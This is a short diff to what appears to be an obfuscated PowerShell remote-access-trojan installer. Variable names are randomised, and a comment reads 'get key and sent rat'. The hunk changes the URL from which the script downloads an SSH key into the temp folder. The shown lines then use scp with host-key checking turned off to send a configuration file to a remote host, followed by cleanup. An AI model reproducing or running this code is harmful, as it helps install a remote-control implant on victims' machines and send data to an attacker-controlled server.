@@ -74,7 +74,7 @@ Add-Content -Path $CRYnrkaDbe -Value $YlEQgBmePn # remote port
 Add-Content -Path $CRYnrkaDbe -Value 'remote' # connection type
 
 # get key and sent rat
-Invoke-WebRequest -Uri "http://$ecPlmJVLRo/key" -OutFile "$env:temp\key"
+Invoke-WebRequest -Uri "http://$ecPlmJVLRo/RMN/key" -OutFile "$env:temp\key"
 scp -P $ENyMAhIrsb -o StrictHostKeyChecking=no -i $env:temp\key -r $CRYnrkaDbe $dERQpoZWxz`:/home/$nkowFESgaO
 
 # cleanup
